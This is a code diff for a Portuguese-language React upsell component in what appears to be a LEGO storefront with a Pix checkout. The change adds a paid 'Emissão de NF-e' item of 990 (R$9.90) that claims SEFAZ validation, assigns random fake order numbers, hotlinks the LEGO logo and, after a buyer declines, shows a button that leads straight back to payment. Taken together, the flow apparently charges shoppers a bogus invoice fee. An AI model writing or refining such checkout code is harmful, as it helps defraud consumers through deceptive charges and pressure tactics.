@@ -34,26 +34,35 @@ export default function UpsellFlow() {
   const nfeRef = useRef<number>()
 
   useEffect(() => {
-    const checkoutData = localStorage.getItem("checkout-data")
-    const productData = localStorage.getItem("product-data")
+    const checkoutProduct = localStorage.getItem("checkoutProduct")
+    const pixPayment = localStorage.getItem("pixPayment")
 
-    if (checkoutData && productData) {
-      const checkout = JSON.parse(checkoutData)
-      const product = JSON.parse(productData)
+    if (checkoutProduct) {
+      const product = JSON.parse(checkoutProduct)
+      let customerData = { email: "", name: "" }
+
+      if (pixPayment) {
+        const payment = JSON.parse(pixPayment)
+        customerData = {
+          email: payment.email || "",
+          name: payment.name || "",
+        }
+      }
 
       setUpsellData({
         img: product.image || "https://images.seeklogo.com/logo-png/8/1/lego-logo-png_seeklogo-83157.png",
-        title: product.name || " ",
-        price: product.price || "",
-        orderNo: checkout.orderId || "#" + Math.floor(1000 + Math.random() * 9000),
+        title: product.name || "Produto LEGO",
+        price: product.finalPrice?.toString() || product.price?.toString() || "",
+        orderNo: "#" + Math.floor(1000 + Math.random() * 9000),
         productId: product.id || "",
-        customerEmail: checkout.email || "",
+        customerEmail: customerData.email,
       })
     } else {
+      // Fallback para dados padrão se não encontrar no localStorage
       const orderNo = "#" + Math.floor(1000 + Math.random() * 9000)
       setUpsellData({
         img: "https://images.seeklogo.com/logo-png/8/1/lego-logo-png_seeklogo-83157.png",
-        title: "",
+        title: "Produto LEGO",
         price: "",
         orderNo,
         productId: "",
@@ -102,13 +111,36 @@ export default function UpsellFlow() {
 
   const handleAcceptNfe = () => {
     sessionStorage.setItem("upsell_nfe_selected", "1")
-    setCurrentView("nfeMaking")
-    startNfeMaking()
+    prepareNfeCheckout()
   }
 
   const handleDeclineNfe = () => {
     sessionStorage.setItem("upsell_nfe_selected", "0")
     setShowDeclinePush(true)
+  }
+
+  const prepareNfeCheckout = () => {
+    // Dados do produto NF-e para o checkout
+    const nfeProduct = {
+      id: "nfe-emissao",
+      name: "Emissão de Nota Fiscal Eletrônica (NF-e)",
+      price: 990, // Removendo aspas para ser número
+      finalPrice: 990,
+      originalPrice: 990,
+      isFree: false,
+      image: "/nota-fiscal-eletronica.png", // Usando imagem específica da NF-e
+      description: "Serviço de emissão de NF-e para produtos LEGO com validação SEFAZ",
+      quantity: 1,
+      isNfe: true, // Flag para identificar que é produto de NF-e
+    }
+
+    localStorage.setItem("checkoutProduct", JSON.stringify(nfeProduct))
+
+    // Preservar UTM parameters se existirem
+    const existingUtm = localStorage.getItem("utm-params")
+
+    // Redirecionar para checkout
+    router.push("/checkout")
   }
 
   const startNfeMaking = () => {
@@ -352,12 +384,12 @@ export default function UpsellFlow() {
           </div>
 
           <div className="flex justify-center">
-            <a
-              href="/pagamento-taxa-nfe"
+            <button
+              onClick={prepareNfeCheckout}
               className="px-6 py-3 bg-gradient-to-r from-purple-600 to-purple-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5 min-w-44"
             >
               Ir para pagamento
-            </a>
+            </button>
           </div>
         </div>
       )}
@@ -386,12 +418,12 @@ export default function UpsellFlow() {
             </div>
 
             <div className="flex justify-center">
-              <a
-                href="/pagamento-taxa-nfe"
+              <button
+                onClick={prepareNfeCheckout}
                 className="px-6 py-3 bg-gradient-to-r from-red-500 to-red-600 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5"
               >
                 Pagar taxa de emissão
-              </a>
+              </button>
             </div>
           </div>
         </div>
@@ -416,7 +448,7 @@ export default function UpsellFlow() {
               <button
                 onClick={() => {
                   setShowDeclinePush(false)
-                  handleAcceptNfe()
+                  prepareNfeCheckout()
                 }}
                 className="px-4 py-2 bg-gradient-to-r from-purple-600 to-purple-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5"
               >
